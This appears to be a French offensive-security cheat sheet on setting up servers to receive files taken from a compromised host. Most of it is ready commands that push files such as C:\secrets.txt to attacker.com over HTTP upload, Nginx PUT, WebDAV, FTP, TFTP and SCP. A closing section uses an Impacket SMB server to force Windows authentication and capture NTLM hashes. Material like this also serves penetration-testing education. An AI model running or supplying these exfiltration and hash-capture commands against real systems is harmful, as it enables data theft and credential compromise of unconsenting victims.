# Configuration de Serveurs pour Réception de Fichiers

## Serveurs HTTP/S pour Réception

### Serveurs HTTP Rapides

```bash
# Python Simple HTTP Server
python3 -m http.server 80

# Avec PHP
php -S 0.0.0.0:80

# Avec Ruby
ruby -run -ehttpd . -p80
```

### Serveurs HTTP avec Upload

```bash
# Python avec module uploadserver
sudo pip3 install uploadserver
python3 -m uploadserver 80

# Utilisation
curl -F 'files=@/path/to/local/file' http://attacker.com/upload
```

### HTTPS avec Certificat Auto-signé

```bash
# Créer un certificat auto-signé
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=attacker.com'

# Démarrer le serveur avec HTTPS
sudo python3 -m uploadserver 443 --server-certificate server.pem
```

## Configuration Nginx pour Upload

Nginx offre une solution plus robuste pour les transferts de fichiers volumineux.

```bash
# 1. Créer le répertoire de réception
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# 2. Créer la configuration Nginx
cat > /etc/nginx/sites-available/upload.conf << 'EOF'
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
EOF

# 3. Activer le site
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# 4. Redémarrer Nginx
sudo systemctl restart nginx.service

# Utilisation
curl -T /path/to/local/file http://attacker.com:9001/SecretUploadDirectory/file.txt
```

## WebDAV (SMB sur HTTP)

WebDAV permet de monter un partage comme un lecteur réseau sous Windows.

```bash
# Installation sur Linux
sudo pip3 install wsgidav cheroot

# Démarrage du serveur
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Utilisation depuis Windows
dir \\attacker.com\DavWWWRoot\
copy C:\secrets.txt \\attacker.com\DavWWWRoot\
```

## Serveur FTP

```bash
# FTP avec Python pyftpdlib
sudo pip3 install pyftpdlib

# Démarrage du serveur FTP avec accès en écriture
sudo python3 -m pyftpdlib --port 21 --write

# Utilisation depuis Windows PowerShell
(New-Object Net.WebClient).UploadFile('ftp://attacker.com/upload.txt', 'C:\secrets.txt')

# Utilisation avec commande FTP classique
echo open attacker.com > ftpcmd.txt
echo USER anonymous >> ftpcmd.txt
echo binary >> ftpcmd.txt
echo PUT C:\secrets.txt >> ftpcmd.txt
echo bye >> ftpcmd.txt
ftp -s:ftpcmd.txt
```

## Serveur TFTP

Utile pour les environnements limités comme les équipements réseau.

```bash
# Installation sur Linux
sudo apt-get install tftpd-hpa

# Configuration
sudo nano /etc/default/tftpd-hpa
# TFTP_DIRECTORY="/tftp"
# TFTP_OPTIONS="--secure --create"

# Démarrage du service
sudo systemctl restart tftpd-hpa

# Utilisation depuis Windows
tftp -i attacker.com put C:\secrets.txt
```

## Serveur SSH/SCP/SFTP

```bash
# Configuration du serveur SSH
sudo nano /etc/ssh/sshd_config
# Uncomment: Subsystem sftp /usr/lib/openssh/sftp-server

# Redémarrage du service
sudo systemctl restart ssh

# Création d'un utilisateur pour les transferts
sudo useradd -m transferuser
sudo passwd transferuser

# Utilisation depuis la cible
scp /path/to/file transferuser@attacker.com:/home/transferuser/
```

## Capture de Hachages NTLM pour Relais

Utile pour les environnements Windows avec authentification automatique.

```bash
# Installation d'Impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && pip3 install .

# Configuration d'un serveur SMB
sudo impacket-smbserver share /tmp -smb2support

# Forcer l'authentification depuis Windows
dir \\attacker.com\share\

# Le serveur capturera les hachages NTLM
```

## Points Importants

- Choisir le service en fonction des restrictions de l'environnement
- Les serveurs HTTP simples sont rapides à mettre en place mais moins sécurisés
- Pour les fichiers volumineux, Nginx offre de meilleures performances
- WebDAV est très pratique pour les environnements Windows
- FTP fonctionne dans presque tous les environnements mais n'est pas chiffré
- Préférer SFTP/SCP pour les transferts sécurisés
- Vérifier les journaux et nettoyer les fichiers sensibles après utilisation